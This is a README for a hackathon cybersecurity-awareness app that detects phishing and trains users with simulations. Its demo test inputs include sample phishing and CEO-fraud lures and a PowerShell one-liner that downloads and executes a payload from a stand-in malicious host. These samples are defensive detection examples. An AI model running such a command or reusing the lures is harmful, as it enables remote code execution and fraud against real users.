<div align="center">

# 🛡️ SENTINEL AI

### AI-Powered Cybersecurity Intelligence Platform

*The last line of defense between humans and threats.*

[![React](https://img.shields.io/badge/React-18-61DAFB?style=flat-square&logo=react)](https://reactjs.org/)
[![Vite](https://img.shields.io/badge/Vite-5-646CFF?style=flat-square&logo=vite)](https://vitejs.dev/)
[![Node.js](https://img.shields.io/badge/Node.js-20-339933?style=flat-square&logo=node.js)](https://nodejs.org/)
[![TailwindCSS](https://img.shields.io/badge/Tailwind-4-06B6D4?style=flat-square&logo=tailwindcss)](https://tailwindcss.com/)

</div>

---

## ⚡ What is SENTINEL AI?

SENTINEL AI is a production-grade cybersecurity awareness and threat intelligence platform that uses AI to analyze suspicious content, train users against phishing attacks, and track security awareness progression — all wrapped in a stunning dark-themed SOC (Security Operations Center) interface.

## 🚀 Features

| Feature | Description |
|---------|-------------|
| **🔍 Threat Analyzer** | AI-powered analysis of emails, URLs, messages, and code with severity scoring, threat DNA breakdown, and actionable reports |
| **📊 Intelligence Dashboard** | Real-time security operations overview with interactive charts, KPIs, live feed, and threat category breakdown |
| **🎯 Phishing Simulator** | 6 interactive training scenarios with realistic email mockups, timed challenges, red flag highlighting, and scoring |
| **🤖 SENTINEL Chat** | AI security assistant for cybersecurity education with curated knowledge base |
| **📋 Threat History** | Searchable, filterable log of all analyses with detailed side-drawer view |
| **📄 Report Center** | Professional report generation with PDF, JSON, and clipboard export options |
| **🧠 Awareness Score** | Gamified progression system with achievements, XP tracking, and level badges |

## 🛠️ Tech Stack

**Frontend:** React 18 · Vite · Tailwind CSS v4 · Framer Motion · Recharts · Lucide Icons · React Hot Toast

**Backend:** Node.js · Express · OpenAI GPT-4o-mini

**Design:** Dark theme (#0A0E1A) · Glassmorphism · Animated grid background · Inter + JetBrains Mono fonts

## 📦 Quick Start

```bash
# 1. Clone and enter directory
cd sentinel-ai

# 2. Install all dependencies
npm run install:all
npm install

# 3. (Optional) Add your OpenAI API key for AI-powered analysis
#    Edit .env and replace sk-your-openai-api-key-here with your key
#    Without an API key, SENTINEL uses intelligent heuristic analysis

# 4. Start the application
npm run dev
```

The app runs on **http://localhost:5173** with the API server on port 3001.

## 🔑 API Key Setup (Optional)

SENTINEL AI works out of the box without an API key using built-in heuristic analysis. For enhanced AI-powered analysis:

1. Get an API key from [OpenAI](https://platform.openai.com/)
2. Edit `.env` and set `OPENAI_API_KEY=sk-your-actual-key`
3. Restart the server

## 🎯 Demo Script (60 seconds)

> *"We built SENTINEL AI — an AI-powered cybersecurity intelligence platform. Let me show you what it can do."*

1. **Threat Analyzer** — Paste a phishing email → watch the dramatic analysis animation → see the threat verdict with severity meter, AI report, and threat DNA breakdown
2. **Dashboard** — Show real-time stats updating with charts and live feed
3. **Phishing Simulator** — Run through a scenario, show red flag highlighting
4. **Awareness Score** — Show gamification with achievements unlocking
5. **Export** — Generate a professional PDF report

## 📝 Test Inputs for Demo

**Phishing Email:**
```
From: security@paypa1-verify.com
Subject: Your account has been suspended!

Dear Customer, we detected unauthorized access to your PayPal account.
Click here immediately to verify your identity: https://paypa1-verify.com/login
Failure to verify within 24 hours will result in permanent account suspension.
```

**Phishing Email 2:**
```
Congratulations! You've been selected as this month's winner of a $500 Amazon Gift Card!
Claim now at: http://amaz0n-rewards.com/claim?id=winner2026
Offer expires in 1 hour. Act now!
```

**Malware:**
```
URGENT: Please enable macros and download the attached invoice.exe
Run the following to update: powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://mal-server.com/payload')"
```

**Social Engineering:**
```
Hi, this is the CEO speaking. I need you to urgently wire $5,000 to this account for a confidential deal. Don't tell anyone and keep this between us. Send it via Western Union ASAP.
```

**Safe Content:**
```
Hey team, just a reminder that our weekly standup is tomorrow at 10am.
The meeting link is the same as usual. See you there!
```

## 📁 Project Structure

```
sentinel-ai/
├── client/                 # React + Vite frontend
│   ├── src/
│   │   ├── components/     # Reusable UI components
│   │   ├── pages/          # 7 application pages
│   │   ├── context/        # Global state management
│   │   ├── hooks/          # Custom React hooks
│   │   └── utils/          # Report generation utilities
│   └── index.html
├── server/                 # Node.js + Express backend
│   ├── routes/             # API routes (analyze, chat)
│   └── index.js            # Server entry point
├── .env                    # Environment configuration
└── package.json            # Root scripts
```

---

<div align="center">

**Built for CODESTORM HACKATHON 2K26**

Made with ⚡ by the SENTINEL AI Team

</div>
